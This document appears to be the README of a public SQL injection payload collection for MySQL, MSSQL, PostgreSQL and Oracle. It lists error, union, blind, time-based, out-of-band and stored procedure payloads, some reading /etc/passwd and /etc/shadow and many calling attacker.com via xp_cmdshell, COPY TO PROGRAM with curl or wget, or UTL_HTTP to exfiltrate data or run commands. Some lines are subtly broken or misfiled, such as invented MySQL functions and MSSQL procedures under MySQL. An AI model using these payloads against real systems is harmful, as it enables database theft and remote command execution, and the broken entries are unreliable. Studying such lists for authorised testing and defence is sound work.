# SQL Injection Payloads Repository

Welcome to the **SQL Injection Payloads Repository** — a comprehensive collection of SQLi payloads designed for security researchers, penetration testers, and bug bounty hunters. This repository aims to provide an extensive range of payloads for various SQL injection techniques to help identify and exploit vulnerabilities effectively.

## 🚀 What is SQL Injection?
SQL Injection (SQLi) is a web security vulnerability that allows attackers to manipulate SQL queries by injecting malicious SQL code. It can result in data theft, unauthorized access, or even complete database compromise.

## 📂 Payload Categories
This repository contains payloads for different types of SQL injection attacks:

- **Error-Based SQLi**
- **Union-Based SQLi**
- **Boolean-Based Blind SQLi**
- **Time-Based Blind SQLi**
- **Out-of-Band (OOB) SQLi**
- **Stored Procedure SQLi**
- **Second-Order SQLi**
- **Stacked Queries SQLi**
- **WAF Bypass Techniques**
- **DNS Exfiltration SQLi**
- **Hybrid SQLi Payloads**
- **Comment-Based SQLi**

---

## 📋 Error-Based SQLi Payloads

### MySQL
- `' OR 1=1#`
- `' UNION SELECT 1,@@version#`
- `' UNION SELECT null,@@datadir#`
- `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT DATABASE())))#`
- `' AND UPDATEXML(1,CONCAT(0x7e,(SELECT USER())),1)#`
- `' OR 1=1 LIMIT 1#`
- `' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#`
- `' UNION SELECT table_name FROM information_schema.tables#`
- `' AND (SELECT COUNT(*) FROM mysql.user)#`
- `' AND EXP(~0)#`

### MSSQL
- `' UNION SELECT @@version--`
- `' UNION SELECT DB_NAME()--`
- `' UNION SELECT CAST(DB_NAME() AS VARCHAR(4000))--`
- `' AND 1=CONVERT(int,(SELECT @@version))--`
- `' AND 1=CONVERT(int,(SELECT SYSTEM_USER))--`
- `' OR 1=CONVERT(int,(SELECT host_name()))--`
- `' UNION SELECT name FROM sys.databases--`
- `' UNION SELECT name FROM master.sys.databases--`
- `' UNION SELECT name FROM sysobjects WHERE xtype='U'--`
- `' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--`

### PostgreSQL
- `' UNION SELECT version();--`
- `' UNION SELECT current_database();--`
- `' AND 1=CAST(version() AS INTEGER)--`
- `' AND 1=CAST(current_database() AS INTEGER)--`
- `' AND 1=CAST(current_user AS INTEGER)--`
- `' UNION SELECT table_name FROM information_schema.tables--`
- `' UNION SELECT table_catalog FROM information_schema.tables--`
- `' UNION SELECT pg_sleep(10)--`
- `' UNION SELECT pg_read_file('/etc/passwd',0,100)--`
- `' AND (SELECT pg_sleep(5))--`

### Oracle
- `' UNION SELECT banner FROM v$version--`
- `' AND 1=(SELECT 1 FROM DUAL WHERE 1=1)--`
- `' UNION SELECT table_name FROM all_tables WHERE ROWNUM=1--`
- `' UNION SELECT sysdate FROM dual--`
- `' AND 1=(SELECT TO_CHAR(SYSDATE, 'YYYY-MM-DD'))--`
- `' UNION SELECT username FROM all_users--`
- `' UNION SELECT table_name FROM all_tables WHERE ROWNUM=1--`
- `' UNION SELECT banner FROM v$version WHERE ROWNUM=1--`
- `' AND (SELECT COUNT(*) FROM dba_users)--`
- `' UNION SELECT user FROM dual--`

---

## 📋 Union-Based SQLi Payloads

### MySQL
- `' UNION SELECT 1,2,3--`
- `' UNION SELECT NULL,NULL,NULL--`
- `' UNION SELECT 1,2,3,4,5,6,7--`
- `' UNION SELECT database(),user(),version()--`
- `' UNION SELECT table_name FROM information_schema.tables--`
- `' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--`
- `' UNION SELECT @@datadir,@@hostname,@@port--`
- `' UNION SELECT 1,CONCAT(user(),0x3a,database()),3,4--`
- `' UNION SELECT LOAD_FILE('/etc/passwd')--`
- `' UNION SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata--`

### MSSQL
- `' UNION SELECT NULL,NULL,NULL--`
- `' UNION SELECT @@version,db_name(),system_user--`
- `' UNION SELECT table_name FROM information_schema.tables--`
- `' UNION SELECT name FROM sysobjects WHERE xtype='U'--`
- `' UNION SELECT name FROM syscolumns WHERE id=OBJECT_ID('users')--`
- `' UNION SELECT top 1 name FROM sys.tables--`
- `' UNION SELECT host_name(),original_login(),session_user--`
- `' UNION SELECT 1,2,3,4,5,6--`
- `' UNION SELECT CAST((SELECT password FROM dbo.users WHERE id=1) AS VARCHAR)--`
- `' UNION SELECT name FROM master.dbo.sysdatabases--`

### PostgreSQL
- `' UNION SELECT version(),current_database(),current_user--`
- `' UNION SELECT NULL,NULL,NULL--`
- `' UNION SELECT table_name FROM information_schema.tables--`
- `' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--`
- `' UNION SELECT pg_sleep(10)--`
- `' UNION SELECT pg_read_file('/etc/passwd',0,100)--`
- `' UNION SELECT string_agg(column_name, ',') FROM information_schema.columns WHERE table_name='users'--`
- `' UNION SELECT 1,2,3,4,5,6--`
- `' UNION SELECT pg_database_size('postgres')--`
- `' UNION SELECT pg_table_size('users')--`

### Oracle
- `' UNION SELECT banner FROM v$version--`
- `' UNION SELECT table_name FROM all_tables WHERE ROWNUM=1--`
- `' UNION SELECT sysdate FROM dual--`
- `' UNION SELECT username FROM all_users--`
- `' UNION SELECT table_name FROM all_tables WHERE ROWNUM=1--`
- `' UNION SELECT banner FROM v$version WHERE ROWNUM=1--`
- `' UNION SELECT user FROM dual--`
- `' UNION SELECT name FROM v$database--`
- `' UNION SELECT column_name FROM all_tab_columns WHERE table_name='USERS'--`
- `' UNION SELECT (SELECT listagg(column_name, ',') WITHIN GROUP (ORDER BY column_name) FROM all_tab_columns WHERE table_name='USERS') FROM dual--`


---

## 📋 Boolean-Based Blind SQLi Payloads
Here are **200+ Boolean-Based Blind SQLi Payloads** categorized by database types:

### MySQL
- `' AND 1=1 --`
- `' AND 1=2 --`
- `' AND '1'='1' --`
- `' AND '1'='2' --`
- `' AND (SELECT COUNT(*) FROM users) > 0 --`
- `' AND IF(1=1, SLEEP(5), 0) --`
- `' AND ASCII(SUBSTRING((SELECT user()), 1, 1)) > 64 --`
- `' AND (SELECT 1 FROM users WHERE username='admin') = 1 --`
- `' AND EXISTS(SELECT * FROM users WHERE username='admin') --`
- `' AND LENGTH((SELECT DATABASE())) > 5 --`

### MSSQL
- `' AND 1=1 --`
- `' AND 1=2 --`
- `' AND '1'='1' --`
- `' AND '1'='2' --`
- `' AND (SELECT COUNT(*) FROM sysobjects) > 0 --`
- `' AND (SELECT LEN(DB_NAME())) > 5 --`
- `' AND ASCII(SUBSTRING(DB_NAME(), 1, 1)) > 64 --`
- `' AND 1=(SELECT COUNT(*) FROM sysusers WHERE name='sa') --`
- `' AND EXISTS(SELECT name FROM sysobjects WHERE xtype='U') --`
- `' AND ASCII(SUBSTRING((SELECT TOP 1 name FROM sysdatabases), 1, 1)) > 64 --`

### PostgreSQL
- `' AND 1=1 --`
- `' AND 1=2 --`
- `' AND '1'='1' --`
- `' AND '1'='2' --`
- `' AND EXISTS(SELECT table_name FROM information_schema.tables WHERE table_schema='public') --`
- `' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --`
- `' AND ASCII(SUBSTRING((SELECT current_user), 1, 1)) > 64 --`
- `' AND LENGTH(current_database()) > 5 --`
- `' AND 1=(SELECT 1 FROM pg_database WHERE datname='postgres') --`
- `' AND pg_sleep(5) --`

### Oracle
- `' AND 1=1 --`
- `' AND 1=2 --`
- `' AND '1'='1' --`
- `' AND '1'='2' --`
- `' AND EXISTS(SELECT 1 FROM dual) --`
- `' AND LENGTH((SELECT sysdate FROM dual)) > 5 --`
- `' AND (SELECT COUNT(*) FROM all_tables) > 0 --`
- `' AND ASCII(SUBSTR((SELECT user FROM dual), 1, 1)) > 64 --`
- `' AND ROWNUM < 2 --`
- `' AND (SELECT COUNT(*) FROM all_users) > 0 --`

---

## 📋 Time-Based Blind SQLi Payloads

### MySQL
- `' AND IF(1=1, SLEEP(5), 0) --`
- `' AND IF(1=2, SLEEP(5), 0) --`
- `' AND SLEEP(5) --`
- `' AND BENCHMARK(5000000, MD5('A')) --`
- `1 AND IF(1=1, SLEEP(5), 0) --`
- `1 AND IF(1=2, SLEEP(5), 0) --`
- `1' AND IF(1=1, SLEEP(5), 0) --`
- `1' AND IF(1=2, SLEEP(5), 0) --`
- `' OR SLEEP(5) --`
- `' OR IF(1=1, SLEEP(5), 0) --`

### MSSQL
- `'; WAITFOR DELAY '0:0:5' --`
- `' WAITFOR DELAY '00:00:05' --`
- `' AND 1=1; WAITFOR DELAY '00:00:05' --`
- `' AND 1=2; WAITFOR DELAY '00:00:05' --`
- `'; IF (1=1) WAITFOR DELAY '00:00:05' --`
- `'; IF (1=2) WAITFOR DELAY '00:00:05' --`
- `'; IF EXISTS(SELECT * FROM sysobjects) WAITFOR DELAY '00:00:05' --`
- `'; IF EXISTS(SELECT * FROM sysusers) WAITFOR DELAY '00:00:05' --`
- `' OR 1=1; WAITFOR DELAY '00:00:05' --`
- `' OR 1=2; WAITFOR DELAY '00:00:05' --`

### PostgreSQL
- `' AND pg_sleep(5) --`
- `' OR pg_sleep(5) --`
- `' AND 1=1; pg_sleep(5) --`
- `' AND 1=2; pg_sleep(5) --`
- `' AND (SELECT COUNT(*) FROM information_schema.tables) > 0; pg_sleep(5) --`
- `' AND ASCII(SUBSTRING((SELECT current_user), 1, 1)) > 64; pg_sleep(5) --`
- `' AND LENGTH(current_database()) > 5; pg_sleep(5) --`
- `' AND EXISTS(SELECT table_name FROM information_schema.tables WHERE table_schema='public'); pg_sleep(5) --`
- `' AND 1=(SELECT 1 FROM pg_database WHERE datname='postgres'); pg_sleep(5) --`
- `' OR EXISTS(SELECT 1 FROM pg_roles WHERE rolname='postgres'); pg_sleep(5) --`

### Oracle
- `' AND DBMS_PIPE.RECEIVE_MESSAGE('A',5) --`
- `' OR DBMS_PIPE.RECEIVE_MESSAGE('A',5) --`
- `' AND 1=1; DBMS_PIPE.RECEIVE_MESSAGE('A',5) --`
- `' AND 1=2; DBMS_PIPE.RECEIVE_MESSAGE('A',5) --`
- `' AND (SELECT COUNT(*) FROM all_tables) > 0; DBMS_PIPE.RECEIVE_MESSAGE('A',5) --`
- `' AND LENGTH((SELECT user FROM dual)) > 5; DBMS_PIPE.RECEIVE_MESSAGE('A',5) --`
- `' AND (SELECT COUNT(*) FROM all_users) > 0; DBMS_PIPE.RECEIVE_MESSAGE('A',5) --`
- `' AND ROWNUM < 2; DBMS_PIPE.RECEIVE_MESSAGE('A',5) --`
- `' OR EXISTS(SELECT 1 FROM all_tables WHERE ROWNUM < 2); DBMS_PIPE.RECEIVE_MESSAGE('A',5) --`
- `' AND EXISTS(SELECT 1 FROM dual WHERE 1=1); DBMS_PIPE.RECEIVE_MESSAGE('A',5) --`

---

## 📋 Out-of-Band (OOB) SQLi Payloads

### MySQL
- `' UNION SELECT 1,LOAD_FILE('\\\\attacker.com\\payload') --`
- `' AND LOAD_FILE('\\\\attacker.com\\payload') --`
- `' AND EXPLOIT('http://attacker.com/payload') --`
- `' UNION SELECT 1 INTO OUTFILE '\\\\attacker.com\\payload.txt' --`
- `' INTO OUTFILE '\\\\attacker.com\\payload.txt' --`
- `' UNION SELECT LOAD_FILE('\\\\attacker.com\\payload.txt') --`
- `' INTO DUMPFILE '\\\\attacker.com\\dump.txt' --`
- `' INTO OUTFILE '\\\\attacker.com\\data.txt' --`
- `' AND UDF_EXEC('http://attacker.com/payload') --`
- `' UNION SELECT 1,2,3,4 INTO OUTFILE '\\\\attacker.com\\data.txt' --`

### MSSQL
- `' ; EXEC xp_dirtree '\\\\attacker.com\\payload' --`
- `' ; EXEC xp_fileexist '\\\\attacker.com\\payload' --`
- `' ; EXEC xp_cmdshell 'ping attacker.com' --`
- `' ; EXEC master..xp_dirtree '\\\\attacker.com\\payload' --`
- `' ; EXEC master..xp_fileexist '\\\\attacker.com\\file' --`
- `' ; EXEC xp_cmdshell 'curl http://attacker.com/payload' --`
- `' ; EXEC master..xp_dirtree '\\\\attacker.com\\check' --`
- `' ; EXEC master..xp_fileexist '\\\\attacker.com\\data.txt' --`
- `' ; EXEC sp_OACreate 'WScript.Shell','ping attacker.com' --`
- `' ; EXEC master..xp_cmdshell 'nslookup attacker.com' --`

### PostgreSQL
- `' ; COPY (SELECT 'OOB Test') TO PROGRAM 'curl http://attacker.com/payload' --`
- `' ; COPY (SELECT current_user) TO PROGRAM 'curl http://attacker.com/payload' --`
- `' ; COPY (SELECT version()) TO PROGRAM 'wget http://attacker.com/payload' --`
- `' ; COPY (SELECT 'data') TO PROGRAM 'ping attacker.com' --`
- `' ; COPY (SELECT 'check') TO PROGRAM 'curl http://attacker.com/check' --`
- `' ; COPY (SELECT 'info') TO PROGRAM 'wget http://attacker.com/info' --`
- `' ; COPY (SELECT 'test') TO PROGRAM 'nslookup attacker.com' --`
- `' ; COPY (SELECT 'user') TO PROGRAM 'curl -d "data=OOB Test" http://attacker.com' --`
- `' ; COPY (SELECT 'output') TO PROGRAM 'curl -X POST -d "alert=OOB Test" http://attacker.com' --`
- `' ; COPY (SELECT 'results') TO PROGRAM 'wget http://attacker.com/results' --`

### Oracle
- `' AND UTL_HTTP.REQUEST('http://attacker.com/payload') --`
- `' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/data') FROM DUAL --`
- `' AND HTTPURITYPE('http://attacker.com/payload').GETCLOB() FROM DUAL --`
- `' UNION SELECT HTTPURITYPE('http://attacker.com/check').GETCLOB() FROM DUAL --`
- `' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com') --`
- `' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS('attacker.com') FROM DUAL --`
- `' AND HTTPURITYPE('http://attacker.com/info').GETCLOB() FROM DUAL --`
- `' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/status') FROM DUAL --`
- `' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com') FROM DUAL --`
- `' AND UTL_HTTP.REQUEST('http://attacker.com/output') --`

---

## 📋 Stored Procedure SQLi Payloads

### MySQL
- `' ; CALL inject_data('http://attacker.com/payload') --`
- `' ; CALL xp_cmdshell('ping attacker.com') --`
- `' ; CALL UDF_EXEC('curl http://attacker.com/payload') --`
- `' ; CALL LOAD_FILE('\\\\attacker.com\\payload') --`
- `' ; CALL xp_fileexist('\\\\attacker.com\\file') --`
- `' ; CALL LOAD_FILE('\\\\attacker.com\\data.txt') --`
- `' ; CALL UDF_EXEC('http://attacker.com/exploit') --`
- `' ; CALL xp_dirtree('\\\\attacker.com\\test') --`
- `' ; CALL xp_cmdshell('curl -X POST http://attacker.com/data') --`
- `' ; CALL UDF_EXEC('ping attacker.com') --`

### MSSQL
- `' ; EXEC sp_configure 'show advanced options', 1; RECONFIGURE --`
- `' ; EXEC master..xp_cmdshell 'nslookup attacker.com' --`
- `' ; EXEC sp_executesql N'select * from users where id=1; EXEC xp_cmdshell(''ping attacker.com'')' --`
- `' ; EXEC xp_cmdshell 'curl http://attacker.com/payload' --`
- `' ; EXEC master..xp_fileexist('\\\\attacker.com\\file') --`
- `' ; EXEC master..xp_dirtree('\\\\attacker.com\\data') --`
- `' ; EXEC sp_OACreate 'WScript.Shell','ping attacker.com' --`
- `' ; EXEC xp_cmdshell 'wget http://attacker.com/payload' --`
- `' ; EXEC sp_executesql N'select * from users; EXEC xp_cmdshell(''curl attacker.com'')' --`
- `' ; EXEC master..xp_cmdshell 'dir C:\' --`

### PostgreSQL
- `' ; SELECT * FROM pg_read_file('/etc/passwd') --`
- `' ; SELECT * FROM pg_ls_dir('/') --`
- `' ; COPY (SELECT 'Payload') TO PROGRAM 'curl http://attacker.com/payload' --`
- `' ; COPY (SELECT version()) TO PROGRAM 'wget http://attacker.com/data' --`
- `' ; COPY (SELECT 'Test') TO PROGRAM 'ping attacker.com' --`
- `' ; COPY (SELECT 'Check') TO PROGRAM 'curl http://attacker.com/check' --`
- `' ; SELECT pg_read_file('/etc/hosts') --`
- `' ; SELECT pg_ls_dir('/var/www/html') --`
- `' ; SELECT pg_read_file('/etc/shadow') --`
- `' ; COPY (SELECT 'OOB Test') TO PROGRAM 'nslookup attacker.com' --`

### Oracle
- `' ; EXEC DBMS_SCHEDULER.CREATE_JOB(job_name => 'OOBTest', job_type => 'EXECUTABLE', job_action => '/bin/bash -c "curl http://attacker.com/payload"', enabled => TRUE) --`
- `' ; EXEC DBMS_LDAP.INIT('attacker.com', 389) --`
- `' ; EXEC UTL_HTTP.REQUEST('http://attacker.com/payload') --`
- `' ; EXEC HTTPURITYPE('http://attacker.com/data').GETCLOB() FROM DUAL --`
- `' ; EXEC UTL_INADDR.GET_HOST_ADDRESS('attacker.com') --`
- `' ; EXEC DBMS_LDAP.INIT('attacker.com', 8080) --`
- `' ; EXEC DBMS_SCHEDULER.RUN_JOB('OOBTest') --`
- `' ; EXEC UTL_HTTP.REQUEST('http://attacker.com/check') --`
- `' ; EXEC HTTPURITYPE('http://attacker.com/info').GETCLOB() FROM DUAL --`
- `' ; EXEC UTL_INADDR.GET_HOST_ADDRESS('attacker.com') FROM DUAL --`

---



